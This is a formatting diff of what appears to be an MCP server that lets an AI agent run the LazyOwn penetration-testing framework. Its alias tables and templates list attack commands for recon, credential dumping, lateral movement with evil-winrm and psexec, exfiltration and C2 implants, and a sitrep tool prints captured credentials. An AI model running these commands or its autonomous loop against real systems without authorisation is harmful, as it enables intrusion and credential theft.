                     "open_ports": [s.strip() for s in open_ports[:50]],
                     "pwntomate": [s.strip() for s in pwntomate_lines],
                 },
@@ -6453,9 +6626,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 "recommend_top": recommend_top,
             }
             try:
-                take_snapshot(SESSIONS_DIR, cfg, locals().get("wm") or {},
-                              _json.loads((LAZYOWN_DIR / "sessions" / "tasks.json").read_text())
-                              if (LAZYOWN_DIR / "sessions" / "tasks.json").exists() else [])
+                take_snapshot(
+                    SESSIONS_DIR,
+                    cfg,
+                    locals().get("wm") or {},
+                    _json.loads((LAZYOWN_DIR / "sessions" / "tasks.json").read_text())
+                    if (LAZYOWN_DIR / "sessions" / "tasks.json").exists()
+                    else [],
+                )
             except Exception:
                 pass
             return text(_json.dumps(sitrep_dict, indent=2, default=str))
@@ -6513,7 +6691,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 "title": a.title[:120],
                 "parsed_value": a.parsed_value,
             }
-            for a in audits if not a.keep
+            for a in audits
+            if not a.keep
         ]
 
         result = {
@@ -6586,21 +6765,30 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             return text(json.dumps({"error": "command is required"}))
         timeout_async = int(arguments.get("timeout", 1800))
         if needs_confirmation(name, arguments):
-            return text(json.dumps({
-                "error": "confirmation_required",
-                "message": "Re-call with confirm=true for destructive commands.",
-            }))
+            return text(
+                json.dumps(
+                    {
+                        "error": "confirmation_required",
+                        "message": "Re-call with confirm=true for destructive commands.",
+                    }
+                )
+            )
         job_id = _job_store.submit(
             cmd_async,
             runner=_run_lazyown_command,
             timeout=timeout_async,
         )
-        return text(json.dumps({
-            "job_id": job_id,
-            "command": cmd_async,
-            "timeout": timeout_async,
-            "poll_with": f"lazyown_job_status(job_id='{job_id}')",
-        }, indent=2))
+        return text(
+            json.dumps(
+                {
+                    "job_id": job_id,
+                    "command": cmd_async,
+                    "timeout": timeout_async,
+                    "poll_with": f"lazyown_job_status(job_id='{job_id}')",
+                },
+                indent=2,
+            )
+        )
 
     # ── job_status ────────────────────────────────────────────────────────────
     elif name == "lazyown_job_status":
@@ -6611,61 +6799,107 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 return text(json.dumps({"error": f"unknown job_id: {jid}"}))
             return text(json.dumps(status_rec, indent=2, default=str))
         limit_js = int(arguments.get("limit", 20))
-        return text(json.dumps({
-            "jobs": _job_store.list(limit=limit_js),
-        }, indent=2, default=str))
+        return text(
+            json.dumps(
+                {
+                    "jobs": _job_store.list(limit=limit_js),
+                },
+                indent=2,
+                default=str,
+            )
+        )
 
     # ── phase_guide ───────────────────────────────────────────────────────────
     elif name == "lazyown_phase_guide":
-        pg_phase    = arguments.get("phase", "recon").strip().lower()
-        pg_os       = arguments.get("os_hint", "any").strip().lower()
+        pg_phase = arguments.get("phase", "recon").strip().lower()
+        pg_os = arguments.get("os_hint", "any").strip().lower()
         pg_services = arguments.get("services", [])
 
         # Key aliases per phase (subset of the full aliases dict — most useful ones)
         _PHASE_ALIASES: dict = {
-            "recon":   {"nmap":"lazynmap (full TCP scan)", "hosts_discover":"hostdiscover.sh sweep",
-                        "arpscan":"arp-scan -l", "ping":"TTL-based OS detection"},
-            "enum":    {"ww":"whatweb domain fingerprint", "gobuster":"dir brute-force",
-                        "ffuf":"fast web fuzzer", "ss":"multi-source exploit search",
-                        "dig":"DNS zone transfer/records", "enum4linux":"SMB/LDAP enum",
-                        "nxcridbrute":"RID cycling via nxc", "ntlmrelayx":"NTLM relay"},
-            "exploit": {"sqlmap":"SQL injection", "ss":"searchsploit+NVD+8 sources",
-                        "msf":"metasploit listener", "venom":"msfvenom payload"},
-            "postexp": {"creds":"cat all sessions/credentials*", "hash":"cat all sessions/hash*",
-                        "loot":"copy msf loot to sessions/", "ssh_cmd":"SSH command exec"},
-            "privesc": {"linpeas":"linpeas.sh enum", "winpeas":"winpeas.exe enum",
-                        "getcap":"find capabilities", "lazypwn":"LazyPwn script"},
-            "cred":    {"secretsdump":"impacket secretsdump", "hashcat":"GPU cracking",
-                        "john2hash":"john + hash format", "unshadow":"combine passwd+shadow"},
-            "lateral": {"evil":"evil-winrm -i rhost -u user -p pass",
-                        "cme":"crackmapexec smb/winrm", "psexec":"impacket psexec",
-                        "bloodhound":"bloodhound-python collector"},
-            "exfil":   {"loot":"copy loot to sessions/", "scp":"scp from remote host",
-                        "ftpd":"python ftpd server on 2121"},
-            "c2":      {"cc":"open C2 dashboard", "msf":"metasploit handler",
-                        "venom":"generate payload", "download_c2":"pull implant"},
-            "report":  {"report":"generate AI report via report.py",
-                        "lazyreport":"POST to C2 /lazyreport", "man":"README.md in gum"},
+            "recon": {
+                "nmap": "lazynmap (full TCP scan)",
+                "hosts_discover": "hostdiscover.sh sweep",
+                "arpscan": "arp-scan -l",
+                "ping": "TTL-based OS detection",
+            },
+            "enum": {
+                "ww": "whatweb domain fingerprint",
+                "gobuster": "dir brute-force",
+                "ffuf": "fast web fuzzer",
+                "ss": "multi-source exploit search",
+                "dig": "DNS zone transfer/records",
+                "enum4linux": "SMB/LDAP enum",
+                "nxcridbrute": "RID cycling via nxc",
+                "ntlmrelayx": "NTLM relay",
+            },
+            "exploit": {
+                "sqlmap": "SQL injection",
+                "ss": "searchsploit+NVD+8 sources",
+                "msf": "metasploit listener",
+                "venom": "msfvenom payload",
+            },
+            "postexp": {
+                "creds": "cat all sessions/credentials*",
+                "hash": "cat all sessions/hash*",
+                "loot": "copy msf loot to sessions/",
+                "ssh_cmd": "SSH command exec",
+            },
+            "privesc": {
+                "linpeas": "linpeas.sh enum",
+                "winpeas": "winpeas.exe enum",
+                "getcap": "find capabilities",
+                "lazypwn": "LazyPwn script",
+            },
+            "cred": {
+                "secretsdump": "impacket secretsdump",
+                "hashcat": "GPU cracking",
+                "john2hash": "john + hash format",
+                "unshadow": "combine passwd+shadow",
+            },
+            "lateral": {
+                "evil": "evil-winrm -i rhost -u user -p pass",
+                "cme": "crackmapexec smb/winrm",
+                "psexec": "impacket psexec",
+                "bloodhound": "bloodhound-python collector",
+            },
+            "exfil": {
+                "loot": "copy loot to sessions/",
+                "scp": "scp from remote host",
+                "ftpd": "python ftpd server on 2121",
+            },
+            "c2": {
+                "cc": "open C2 dashboard",
+                "msf": "metasploit handler",
+                "venom": "generate payload",
+                "download_c2": "pull implant",
+            },
+            "report": {
+                "report": "generate AI report via report.py",
+                "lazyreport": "POST to C2 /lazyreport",
+                "man": "README.md in gum",
+            },
         }
         # Payload keys needed per command category
         _PAYLOAD_KEYS = {
-            "recon":   ["rhost", "lhost", "device"],
-            "enum":    ["rhost", "domain", "wordlist", "dirwordlist", "dnswordlist"],
+            "recon": ["rhost", "lhost", "device"],
+            "enum": ["rhost", "domain", "wordlist", "dirwordlist", "dnswordlist"],
             "exploit": ["rhost", "lhost", "lport", "start_user", "start_pass"],
             "postexp": ["rhost", "lhost", "start_user", "start_pass"],
             "privesc": ["rhost", "lhost", "start_user", "start_pass"],
-            "cred":    ["rhost", "start_user", "start_pass", "wordlist"],
+            "cred": ["rhost", "start_user", "start_pass", "wordlist"],
             "lateral": ["rhost", "domain", "start_user", "start_pass", "lhost"],
-            "exfil":   ["rhost", "lhost", "lport", "start_user", "start_pass"],
-            "c2":      ["lhost", "c2_port", "c2_user", "c2_pass"],
-            "report":  ["api_key", "rhost", "domain"],
+            "exfil": ["rhost", "lhost", "lport", "start_user", "start_pass"],
+            "c2": ["lhost", "c2_port", "c2_user", "c2_pass"],
+            "report": ["api_key", "rhost", "domain"],
         }
 
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from lazyown_bridge import get_dispatcher as _bd_pg
+
             _disp_pg = _bd_pg()
-            all_entries  = _disp_pg.list_phase(pg_phase)
+            all_entries = _disp_pg.list_phase(pg_phase)
         except Exception as e:
             return text(f"Bridge catalog unavailable: {e}")
 
@@ -6674,8 +6908,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             all_entries = [e for e in all_entries if e.os_target in (pg_os, "any")]
         if pg_services:
             svc_set = set(s.lower() for s in pg_services)
-            filtered = [e for e in all_entries if not e.services or
-                        any(s.lower() in svc_set for s in e.services)]
+            filtered = [e for e in all_entries if not e.services or any(s.lower() in svc_set for s in e.services)]
             if filtered:
                 all_entries = filtered  # only filter if results remain
 
@@ -6692,36 +6925,42 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             status = f"✓ {k}={str(v)[:30]}" if v else f"✗ {k}=(not set)"
             key_status.append(status)
 
-        out = [
-            f"{'='*60}",
-            f"PHASE GUIDE: {pg_phase.upper()}  (OS: {pg_os}  Services: {pg_services or 'any'})",
-            f"{'='*60}",
-            "",
-            "▶ ABSTRACTION MODEL",
-            "  LazyOwn commands are HIGH-LEVEL ABSTRACTIONS over real tools.",
-            "  payload.json auto-injects ALL parameters — NEVER write raw flags.",
-            "  Examples:",
-            "    lazynmap          → nmap -sC -sV -p- -T4 -Pn --script vuln {rhost}",
-            "    gobuster          → gobuster dir -u http://{rhost} -w {dirwordlist} ...",
-            "    bloodhound        → bloodhound-python -d {domain} -u {user} -p {pass} -c All",
-            "    evil              → evil-winrm -i {rhost} -u {user} -p {pass}",
-            "    ww                → whatweb http://{domain} -a 3",
-            "    dig               → dig @{rhost} {domain} axfr",
-            "",
-            "▶ PAYLOAD.JSON KEYS FOR THIS PHASE",
-        ] + [f"  {s}" for s in key_status] + [
-            "",
-            f"▶ KEY ALIASES FOR PHASE '{pg_phase}'",
-        ] + [f"  {k:<20} → {v}" for k, v in _PHASE_ALIASES.get(pg_phase, {}).items()] + [
-            "",
-            f"▶ AVAILABLE COMMANDS ({len(all_entries)} from bridge catalog)",
-            f"  {'Command':<24} {'MITRE':<10} {'OS':<8} {'Creds?':<7} {'Services':<18} Description",
-            f"  {'-'*24} {'-'*10} {'-'*8} {'-'*7} {'-'*18} {'-'*40}",
-        ]
+        out = (
+            [
+                f"{'=' * 60}",
+                f"PHASE GUIDE: {pg_phase.upper()}  (OS: {pg_os}  Services: {pg_services or 'any'})",
+                f"{'=' * 60}",
+                "",
+                "▶ ABSTRACTION MODEL",
+                "  LazyOwn commands are HIGH-LEVEL ABSTRACTIONS over real tools.",
+                "  payload.json auto-injects ALL parameters — NEVER write raw flags.",
+                "  Examples:",
+                "    lazynmap          → nmap -sC -sV -p- -T4 -Pn --script vuln {rhost}",
+                "    gobuster          → gobuster dir -u http://{rhost} -w {dirwordlist} ...",
+                "    bloodhound        → bloodhound-python -d {domain} -u {user} -p {pass} -c All",
+                "    evil              → evil-winrm -i {rhost} -u {user} -p {pass}",
+                "    ww                → whatweb http://{domain} -a 3",
+                "    dig               → dig @{rhost} {domain} axfr",
+                "",
+                "▶ PAYLOAD.JSON KEYS FOR THIS PHASE",
+            ]
+            + [f"  {s}" for s in key_status]
+            + [
+                "",
+                f"▶ KEY ALIASES FOR PHASE '{pg_phase}'",
+            ]
+            + [f"  {k:<20} → {v}" for k, v in _PHASE_ALIASES.get(pg_phase, {}).items()]
+            + [
+                "",
+                f"▶ AVAILABLE COMMANDS ({len(all_entries)} from bridge catalog)",
+                f"  {'Command':<24} {'MITRE':<10} {'OS':<8} {'Creds?':<7} {'Services':<18} Description",
+                f"  {'-' * 24} {'-' * 10} {'-' * 8} {'-' * 7} {'-' * 18} {'-' * 40}",
+            ]
+        )
         for e in all_entries:
-            svc  = ",".join((e.services or [])[:3]) or "any"
-            os_t = (e.os_target or "any")
-            mit  = (e.mitre_tactic or "")
+            svc = ",".join((e.services or [])[:3]) or "any"
+            os_t = e.os_target or "any"
+            mit = e.mitre_tactic or ""
             cred = "yes" if e.requires_creds else "no"
             desc = (e.description or "")[:50]
             out.append(f"  {e.command:<24} [{mit:<8}] {os_t:<8} {cred:<7} {svc:<18} {desc}")
@@ -6730,7 +6969,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             kc = _disp_pg.phase_kill_chain()
             idx = kc.index(pg_phase) if pg_phase in kc else -1
-            next_phase = kc[idx+1] if idx >= 0 and idx+1 < len(kc) else "(end)"
+            next_phase = kc[idx + 1] if idx >= 0 and idx + 1 < len(kc) else "(end)"
             out += [
                 "",
                 "▶ KILL-CHAIN POSITION",
@@ -6747,7 +6986,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             "  2. Run first command: lazyown_run_command('<command_name>')",
             "  3. Parse output: lazyown_reactive_suggest(output=..., command=...)",
             "  4. Loop: lazyown_auto_loop(target=rhost, max_steps=10)",
-            f"{'='*60}",
+            f"{'=' * 60}",
         ]
         return text("\n".join(out))
 
@@ -6760,6 +6999,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             try:
                 sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
                 from lazyown_bridge import get_dispatcher as _bd_dc
+
                 _disp_dc = _bd_dc()
                 entries = _disp_dc.list_phase(phase_filter)
                 if not entries:
@@ -6771,12 +7011,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     f"LazyOwn commands for phase: {phase_filter.upper()} ({len(entries)} commands)",
                     "",
                     f"  {'Command':<22} {'MITRE':<9} {'OS':<8} {'Services':<16} Description",
-                    f"  {'-'*22} {'-'*9} {'-'*8} {'-'*16} {'-'*40}",
+                    f"  {'-' * 22} {'-' * 9} {'-' * 8} {'-' * 16} {'-' * 40}",
                 ]
                 for e in entries:
-                    svc  = ",".join(e.services[:4]) if hasattr(e,"services") and e.services else "any"
+                    svc = ",".join(e.services[:4]) if hasattr(e, "services") and e.services else "any"
                     os_t = getattr(e, "os_target", "any") or "any"
-                    mit  = getattr(e, "mitre_tactic", "") or ""
+                    mit = getattr(e, "mitre_tactic", "") or ""
                     desc = getattr(e, "description", "") or ""
                     out.append(f"  {e.command:<22} [{mit:<7}] {os_t:<8} {svc:<16} {desc[:50]}")
                 out.append("\nUse lazyown_command_help(command='<name>') for full docs.")
@@ -6785,30 +7025,25 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 return text(f"[discover_commands] Bridge error: {_ex_dc}\nFalling back to shell help...")
 
         # No-phase mode: run shell 'help' and parse cmd2 categories
-        raw = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _run_lazyown_command("help", timeout=30)
-        )
+        raw = await asyncio.get_event_loop().run_in_executor(None, lambda: _run_lazyown_command("help", timeout=30))
         # cmd2 help format: category header line, then === underline, then
         # commands as space-separated tokens across multiple columns.
         import re as _re
+
         lines = raw.splitlines()
         groups: dict[str, list[str]] = {}
         current_group = "General"
         # Skip banner/startup noise — only parse after "Documented commands" header
-        start_idx = next(
-            (i for i, line in enumerate(lines) if "Documented commands" in line), 0
-        )
+        start_idx = next((i for i, line in enumerate(lines) if "Documented commands" in line), 0)
         lines = lines[start_idx:]
         i = 0
         while i < len(lines):
             line = lines[i]
             # Detect category: next line is all '=' and at least 3 chars
-            if (i + 1 < len(lines)
-                    and _re.match(r"^=+$", lines[i + 1].strip())
-                    and len(lines[i + 1].strip()) >= 3):
+            if i + 1 < len(lines) and _re.match(r"^=+$", lines[i + 1].strip()) and len(lines[i + 1].strip()) >= 3:
                 current_group = line.strip()
                 groups.setdefault(current_group, [])
-                i += 2   # skip the === line
+                i += 2  # skip the === line
                 continue
             # Collect command tokens from content lines (non-header, non-empty)
             stripped = line.strip()
@@ -6829,7 +7064,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 out.append(f"── {group} ({len(cmds)}) ──")
                 # 3-column display
                 for j in range(0, len(cmds), 3):
-                    out.append("  " + "  ".join(f"{c:<30}" for c in cmds[j:j+3]))
+                    out.append("  " + "  ".join(f"{c:<30}" for c in cmds[j : j + 3]))
                 out.append("")
         out.append("Tip: use lazyown_discover_commands(phase='recon') for phase-organized commands.")
         out.append("Tip: use lazyown_command_help(command) for full docs on any command.")
@@ -6840,6 +7075,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         import ast as _ast_help
         import textwrap as _tw
         import warnings as _warn
+
         _warn.filterwarnings("ignore")
         cmd = arguments["command"].strip()
         if cmd.startswith("do_"):
@@ -6849,7 +7085,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             """Extract do_<cmd> docstring from lazyown.py via AST — no shell spawn, no noise."""
             lo_path = LAZYOWN_DIR / "lazyown.py"
             try:
-                src  = lo_path.read_text(errors="replace")
+                src = lo_path.read_text(errors="replace")
                 tree = _ast_help.parse(src)
             except Exception as _e:
                 return f"Could not parse lazyown.py: {_e}"
@@ -6902,15 +7138,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 for f in sorted(addon_dir.glob("*.yaml")):
                     try:
                         import yaml as _yaml
+
                         data = _yaml.safe_load(f.read_text())
                         if isinstance(data, dict):
-                            nm = (data.get("name","") or
-                                  (data.get("tool") or {}).get("name",""))
+                            nm = data.get("name", "") or (data.get("tool") or {}).get("name", "")
                             if nm.lower() == cmd_name.lower():
-                                desc    = data.get("description","")
-                                repo    = (data.get("tool") or {}).get("repo_url","")
-                                install = (data.get("tool") or {}).get("install_command","")
-                                execute = (data.get("tool") or {}).get("execute_command","")
+                                desc = data.get("description", "")
+                                repo = (data.get("tool") or {}).get("repo_url", "")
+                                install = (data.get("tool") or {}).get("install_command", "")
+                                execute = (data.get("tool") or {}).get("execute_command", "")
                                 return (
                                     f"YAML Addon: {nm}\n"
                                     f"Description: {desc}\n"
@@ -6933,6 +7169,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     # ── add_target ────────────────────────────────────────────────────────────
     elif name == "lazyown_add_target":
         from datetime import datetime as _dt
+
         cfg = _load_payload()
         if "_error" in cfg:
             return text(f"Cannot load payload.json: {cfg['_error']}")
@@ -6957,13 +7194,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             action = "updated"
         else:
             new_target = {
-                "ip":         ip,
-                "domain":     arguments.get("domain", ""),
-                "ports":      arguments.get("ports", []),
-                "status":     arguments.get("status", "pending"),
-                "notes":      arguments.get("notes", ""),
-                "tags":       arguments.get("tags", []),
-                "added_at":   _dt.now().isoformat(),
+                "ip": ip,
+                "domain": arguments.get("domain", ""),
+                "ports": arguments.get("ports", []),
+                "status": arguments.get("status", "pending"),
+                "notes": arguments.get("notes", ""),
+                "tags": arguments.get("tags", []),
+                "added_at": _dt.now().isoformat(),
                 "updated_at": _dt.now().isoformat(),
             }
             targets.append(new_target)
@@ -6992,7 +7229,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             ports_str = ",".join(str(p) for p in t.get("ports", [])) or "unknown"
             lines.append(
                 f"{icon} {t['ip']:<18} {t.get('domain', ''):<25} ports:[{ports_str}]  "
-                f"tags:{t.get('tags', [])}  status:{t.get('status','?')}"
+                f"tags:{t.get('tags', [])}  status:{t.get('status', '?')}"
             )
             if t.get("notes"):
                 lines.append(f"   notes: {t['notes']}")
@@ -7001,16 +7238,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     # ── set_active_target ─────────────────────────────────────────────────────
     elif name == "lazyown_set_active_target":
         from datetime import datetime as _dt
+
         cfg = _load_payload()
-        ip  = arguments["ip"].strip()
+        ip = arguments["ip"].strip()
         targets = cfg.get("targets", [])
         target = next((t for t in targets if t.get("ip") == ip), None)
 
         if not target:
-            return text(
-                f"Target {ip} not found in targets list. "
-                f"Add it first with lazyown_add_target."
-            )
+            return text(f"Target {ip} not found in targets list. Add it first with lazyown_add_target.")
 
         # Update active params
         cfg["rhost"] = ip
@@ -7019,7 +7254,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
         # Optionally update status
         if "status" in arguments:
-            target["status"]     = arguments["status"]
+            target["status"] = arguments["status"]
             target["updated_at"] = _dt.now().isoformat()
             cfg["targets"] = targets
 
@@ -7039,18 +7274,16 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_poll_events":
         if not _ensure_engine():
             return text("Event engine not available — check modules/event_engine.py")
-        limit  = int(arguments.get("limit", 20))
+        limit = int(arguments.get("limit", 20))
         status = arguments.get("status", "pending")
-        events = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: read_events(limit=limit, status=status)
-        )
+        events = await asyncio.get_event_loop().run_in_executor(None, lambda: read_events(limit=limit, status=status))
         if not events:
             return text(f"No {status} events.")
         lines = [f"{len(events)} {status} event(s):\n"]
         for ev in events:
             lines.append(
                 f"[{ev['id']}] {ev['timestamp'][:19]}  "
-                f"{'🔴' if ev['severity']=='critical' else '🟡' if ev['severity']=='high' else '🔵'} "
+                f"{'🔴' if ev['severity'] == 'critical' else '🟡' if ev['severity'] == 'high' else '🔵'} "
                 f"{ev['type']}  (rule: {ev['rule_id']})\n"
                 f"  command: {ev['source']['command']}  target: {ev['source']['target']}\n"
                 f"  suggest: {ev['suggest']}\n"
@@ -7062,9 +7295,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_engine():
             return text("Event engine not available.")
         event_id = arguments["event_id"]
-        found = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: ack_event(event_id)
-        )
+        found = await asyncio.get_event_loop().run_in_executor(None, lambda: ack_event(event_id))
         return text(f"Event {event_id} marked as processed." if found else f"Event {event_id} not found.")
 
     # ── add_rule ───────────────────────────────────────────────────────────────
@@ -7072,16 +7303,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_engine():
             return text("Event engine not available.")
         rule = {
-            "id":          arguments["id"],
+            "id": arguments["id"],
             "description": arguments["description"],
-            "trigger":     arguments["trigger"],
-            "event_type":  arguments["event_type"],
-            "severity":    arguments.get("severity", "info"),
-            "suggest":     arguments.get("suggest", ""),
+            "trigger": arguments["trigger"],
+            "event_type": arguments["event_type"],
+            "severity": arguments.get("severity", "info"),
+            "suggest": arguments.get("suggest", ""),
         }
-        result = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: add_rule(rule)
-        )
+        result = await asyncio.get_event_loop().run_in_executor(None, lambda: add_rule(rule))
         return text(f"Rule '{rule['id']}' {result}. Total rules: {len(load_rules())}")
 
     # ── list_event_rules ───────────────────────────────────────────────────────
@@ -7095,10 +7324,10 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         for r in rules:
             trigger_parts = [f"{k}={v!r}" for k, v in r.get("trigger", {}).items()]
             lines.append(
-                f"[{r['id']}] {r.get('event_type','?')} ({r.get('severity','info')})\n"
-                f"  Desc   : {r.get('description','')}\n"
+                f"[{r['id']}] {r.get('event_type', '?')} ({r.get('severity', 'info')})\n"
+                f"  Desc   : {r.get('description', '')}\n"
                 f"  Trigger: {', '.join(trigger_parts) or '(none)'}\n"
-                f"  Suggest: {r.get('suggest','')}\n"
+                f"  Suggest: {r.get('suggest', '')}\n"
             )
         return text("\n".join(lines))
 
@@ -7106,9 +7335,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_heartbeat_status":
         if not _ensure_engine():
             return text("Event engine not available.")
-        running, pid = await asyncio.get_event_loop().run_in_executor(
-            None, _hb_is_running
-        )
+        running, pid = await asyncio.get_event_loop().run_in_executor(None, _hb_is_running)
         pid_file = SESSIONS_DIR / "heartbeat.pid"
         events_file = SESSIONS_DIR / "events.jsonl"
 
@@ -7136,6 +7363,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     # ── campaign_sitrep ───────────────────────────────────────────────────────
     elif name == "lazyown_campaign_sitrep":
         import csv as _csv
+
         sitrep_format = (arguments.get("format") or "pretty").lower()
         sitrep_struct: dict[str, Any] = {
             "world_model": None,
@@ -7164,12 +7392,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     phase_counts[s] = phase_counts.get(s, 0) + 1
                 lines.append(f"\n[WORLD MODEL] hosts={len(hosts)} | states={phase_counts}")
                 for ip, h in list(hosts.items())[:10]:
-                    svcs = ", ".join(f"{p}/{v.get('name','?')}" for p, v in h.get("services", {}).items())
-                    lines.append(f"  {ip} [{h.get('state','?')}] os={h.get('os_hint','?')} svc={svcs or '(none)'}")
+                    svcs = ", ".join(f"{p}/{v.get('name', '?')}" for p, v in h.get("services", {}).items())
+                    lines.append(f"  {ip} [{h.get('state', '?')}] os={h.get('os_hint', '?')} svc={svcs or '(none)'}")
                 if creds_wm:
                     lines.append(f"  Credentials in world model: {len(creds_wm)}")
                     for c in creds_wm[:5]:
-                        lines.append(f"    {c.get('value','?')} on {c.get('host','?')} ({c.get('service','?')})")
+                        lines.append(f"    {c.get('value', '?')} on {c.get('host', '?')} ({c.get('service', '?')})")
             except Exception as e:
                 lines.append(f"[WORLD MODEL] error: {e}")
         else:
@@ -7186,9 +7414,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 notes_sj = sj.get("notes") or ""
                 plan_sj = sj.get("plan") or ""
                 id_rsas = sj.get("id_rsa", [])
-                lines.append(f"\n[SESSION JSON] ts={sj.get('timestamp','?')} creds={len(creds_sj)} hashes={len(hashes_sj)} implants={len(implants)} id_rsa={len(id_rsas)}")
+                lines.append(
+                    f"\n[SESSION JSON] ts={sj.get('timestamp', '?')} creds={len(creds_sj)} hashes={len(hashes_sj)} implants={len(implants)} id_rsa={len(id_rsas)}"
+                )
                 for c in creds_sj[:5]:
-                    lines.append(f"  cred: {c.get('username','?')}:{c.get('contraseña','?')}")
+                    lines.append(f"  cred: {c.get('username', '?')}:{c.get('contraseña', '?')}")
                 for h in hashes_sj[:3]:
                     lines.append(f"  hash: {h}")
                 if notes_sj:
@@ -7200,6 +7430,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
         # 3. Credentials files
         import glob as _glob
+
         cred_files = _glob.glob(str(SESSIONS_DIR / "credentials*.txt"))
         if cred_files:
             lines.append(f"\n[CRED FILES] {len(cred_files)} files")
@@ -7222,7 +7453,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 lines.append(f"\n[TASKS] total={len(tasks)} {by_status}")
                 for t in tasks:
                     if t.get("status") not in ("Done",):
-                        lines.append(f"  [{t.get('status','?')}] #{t.get('id','?')}: {t.get('title','')[:80]}")
+                        lines.append(f"  [{t.get('status', '?')}] #{t.get('id', '?')}: {t.get('title', '')[:80]}")
             except Exception as e:
                 lines.append(f"[TASKS] error: {e}")
 
@@ -7235,7 +7466,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 done = [o for o in objs if o.get("status") == "done"]
                 lines.append(f"\n[OBJECTIVES] total={len(objs)} pending={len(pending)} done={len(done)}")
                 for o in pending[:5]:
-                    lines.append(f"  [pending] {o.get('title','?')[:80]} (p={o.get('priority','?')})")
+                    lines.append(f"  [pending] {o.get('title', '?')[:80]} (p={o.get('priority', '?')})")
             except Exception as e:
                 lines.append(f"[OBJECTIVES] error: {e}")
 
@@ -7244,9 +7475,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if camp_file.exists():
             try:
                 camp = json.loads(camp_file.read_text())
-                lines.append(f"\n[CAMPAIGN] name={camp.get('name','?')} scope={camp.get('scope',[])} status={camp.get('status','?')}")
+                lines.append(
+                    f"\n[CAMPAIGN] name={camp.get('name', '?')} scope={camp.get('scope', [])} status={camp.get('status', '?')}"
+                )
                 for hdata in camp.get("hosts", {}).values():
-                    lines.append(f"  {hdata.get('ip','?')} phase={hdata.get('phase','?')} milestones={len(hdata.get('milestones',[]))}")
+                    lines.append(
+                        f"  {hdata.get('ip', '?')} phase={hdata.get('phase', '?')} milestones={len(hdata.get('milestones', []))}"
+                    )
             except Exception as e:
                 lines.append(f"[CAMPAIGN] error: {e}")
 
@@ -7255,9 +7490,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if lessons_file.exists():
             try:
                 lessons = [json.loads(line) for line in lessons_file.read_text().splitlines() if line.strip()]
-                lines.append(f"\n[LESSONS] {len(lessons)} lessons from {len(set(line.get('campaign_id') for line in lessons))} campaigns")
+                lines.append(
+                    f"\n[LESSONS] {len(lessons)} lessons from {len(set(line.get('campaign_id') for line in lessons))} campaigns"
+                )
                 for les in lessons[-3:]:
-                    lines.append(f"  [{les.get('topic','?')}] {les.get('lesson','')[:120]}")
+                    lines.append(f"  [{les.get('topic', '?')}] {les.get('lesson', '')[:120]}")
             except Exception as e:
                 lines.append(f"[LESSONS] error: {e}")
 
@@ -7266,7 +7503,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if aut_status.exists():
             try:
                 st = json.loads(aut_status.read_text())
-                lines.append(f"\n[DAEMON] running={st.get('running')} phase={st.get('phase')} step={st.get('steps_done')}/{st.get('max_steps')} obj={str(st.get('current_objective',''))[:60]}")
+                lines.append(
+                    f"\n[DAEMON] running={st.get('running')} phase={st.get('phase')} step={st.get('steps_done')}/{st.get('max_steps')} obj={str(st.get('current_objective', ''))[:60]}"
+                )
             except Exception as e:
                 lines.append(f"[DAEMON] error: {e}")
 
@@ -7278,7 +7517,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 lines.append(f"\n[AUTO EVENTS] last {min(5, len(evts))}")
                 for ev in evts[-5:]:
                     p = ev.get("payload", {})
-                    lines.append(f"  [{ev.get('type','?')}] {str(p.get('command') or p.get('objective') or p.get('phase') or '')[:60]}")
+                    lines.append(
